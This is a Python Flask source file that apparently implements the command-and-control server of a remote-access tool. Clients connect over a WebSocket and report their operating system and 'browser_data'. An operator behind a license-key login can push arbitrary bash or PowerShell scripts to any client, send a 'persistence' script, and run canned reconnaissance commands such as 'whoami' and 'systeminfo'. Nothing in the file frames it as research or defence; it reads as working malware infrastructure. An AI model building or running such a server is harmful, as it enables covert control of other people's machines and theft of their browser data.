from flask import Flask, render_template, jsonify, request, redirect, url_for, session
from flask_sock import Sock
import json
import random
import time
import logging
import re
import uuid
import os

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Required for session management
sock = Sock(app)

connected_clients = {}
client_data = []
script_responses = {}  # Store script responses by request_id

# Generate license key and save to file
LICENSE_KEY = str(uuid.uuid4())
KEY_FILE = 'key.txt'

if not os.path.exists(KEY_FILE):
    with open(KEY_FILE, 'w') as f:
        f.write(LICENSE_KEY)
    logger.info(f"Generated new license key: {LICENSE_KEY}")
else:
    with open(KEY_FILE, 'r') as f:
        LICENSE_KEY = f.read().strip()
    logger.info(f"Loaded existing license key: {LICENSE_KEY}")

# Hardcoded persistence script
persistence_script = ""  # Example bash script

# Hardcoded disconnect script (bash)
disconnect_script = "pkill -f 'python.*client.py'"  # Kills the client process on Linux

@app.route('/')
def index():
    if 'authenticated' not in session:
        return redirect(url_for('login'))
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        license_key = request.form.get('license_key')
        if license_key == LICENSE_KEY:
            session['authenticated'] = True
            return redirect(url_for('index'))
        return render_template('login.html', error="Invalid license key")
    return render_template('login.html')

@app.route('/api/clients', methods=['GET'])
def get_clients():
    if 'authenticated' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify({
        "totalClients": len(client_data),
        "activeSessions": len(connected_clients),
        "pendingTasks": random.randint(0, 10),
        "clients": client_data,
        "timestamp": time.time()
    })

@app.route('/api/run_script/<client_id>', methods=['POST'])
def run_script(client_id):
    if 'authenticated' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    if client_id not in connected_clients:
        return jsonify({"status": "error", "message": "Client not connected"}), 404
    
    data = request.get_json()
    shell = data.get("shell")
    script = data.get("script")
    request_id = str(time.time())  # Unique ID for this request
    
    if not shell or not script:
        return jsonify({"status": "error", "message": "Shell and script are required"}), 400
    
    try:
        message = {
            "type": "script",
            "shell": shell,
            "script": script,
            "request_id": request_id
        }
        connected_clients[client_id].send(json.dumps(message))
        return jsonify({"status": "success", "message": f"Script sent to {client_id}", "request_id": request_id})
    except Exception as e:
        logger.error(f"Error sending script to {client_id}: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/run_persistence/<client_id>', methods=['POST'])
def run_persistence(client_id):
    if 'authenticated' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    if client_id not in connected_clients:
        return jsonify({"status": "error", "message": "Client not connected"}), 404
    
    try:
        request_id = str(time.time())
        message = {
            "type": "script",
            "shell": "bash",
            "script": persistence_script,
            "request_id": request_id
        }
        connected_clients[client_id].send(json.dumps(message))
        return jsonify({"status": "success", "message": f"Persistence script sent to {client_id}", "request_id": request_id})
    except Exception as e:
        logger.error(f"Error sending persistence script to {client_id}: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/script_response/<request_id>', methods=['GET'])
def get_script_response(request_id):
    if 'authenticated' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    response = script_responses.get(request_id, {"status": "pending", "result": "Waiting for response..."})
    return jsonify(response)

@sock.route('/ws')
def websocket(ws):
    client_id = None
    try:
        while True:
            message = ws.receive(timeout=30)
            if message is None:
                logger.info("No message received within timeout, keeping connection alive")
                ws.send(json.dumps({"type": "ping"}))
                continue
                
            data = json.loads(message)
            if data.get("type") == "script_response":
                logger.info(f"Script response from {data['client_id']}: {data['result']}")
                script_responses[data['request_id']] = {
                    "status": "success",
                    "client_id": data['client_id'],
                    "result": data['result']
                }
                continue
            
            client_id = data.get("client_id")
            if not client_id or not isinstance(client_id, str) or not re.match(r"\d{3}-\d{3}-\d{3}", client_id):
                logger.error(f"Invalid client ID format: {client_id}")
                ws.send(json.dumps({"type": "error", "message": "Invalid client ID format"}))
                ws.close()
                return

            connected_clients[client_id] = ws
            
            logger.info(f"Received client data: {json.dumps(data, indent=2)}")
            
            existing = next((c for c in client_data if c["id"] == client_id), None)
            if existing:
                existing.update({
                    "name": data["name"],
                    "status": data["status"],
                    "lastActive": data["lastActive"],
                    "os": data["os"],
                    "browser_data": data.get("browser_data", {})
                })
            else:
                client_data.append({
                    "id": client_id,
                    "name": data["name"],
                    "status": data["status"],
                    "lastActive": data["lastActive"],
                    "os": data["os"],
                    "browser_data": data.get("browser_data", {})
                })
            logger.info(f"Client {client_id} updated status: {data['status']}")

    except Exception as e:
        logger.error(f"WebSocket error: {e}")
    finally:
        if client_id and client_id in connected_clients:
            del connected_clients[client_id]
            for client in client_data:
                if client["id"] == client_id:
                    client["status"] = "offline"
            logger.info(f"Client {client_id} disconnected")

def run_script_command(script_name, client_id):
    if client_id not in connected_clients:
        return {"status": "error", "message": "Client not connected"}
    
    if script_name == "disconnect":
        if "Windows" in next((c["os"] for c in client_data if c["id"] == client_id), ""):
            script_content = "taskkill /F /IM python.exe"  # Windows-specific disconnect
            shell = "powershell"
        else:
            script_content = disconnect_script  # Linux bash disconnect
            shell = "bash"
    elif script_name == "sysinfo":
        if "Windows" in next((c["os"] for c in client_data if c["id"] == client_id), ""):
            script_content = "systeminfo"  # Windows system info
            shell = "powershell"
        else:
            script_content = "ip a && hostname && whoami"  # Linux system info
            shell = "bash"
    else:
        return {"status": "error", "message": f"Unknown script: {script_name}"}
    
    try:
        request_id = str(time.time())
        message = {
            "type": "script",
            "shell": shell,
            "script": script_content,
            "request_id": request_id
        }
        connected_clients[client_id].send(json.dumps(message))
        return {"status": "success", "message": f"Script '{script_name}' sent to {client_id}", "request_id": request_id}
    except Exception as e:
        logger.error(f"Error sending script {script_name} to {client_id}: {e}")
        return {"status": "error", "message": str(e)}

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=8000)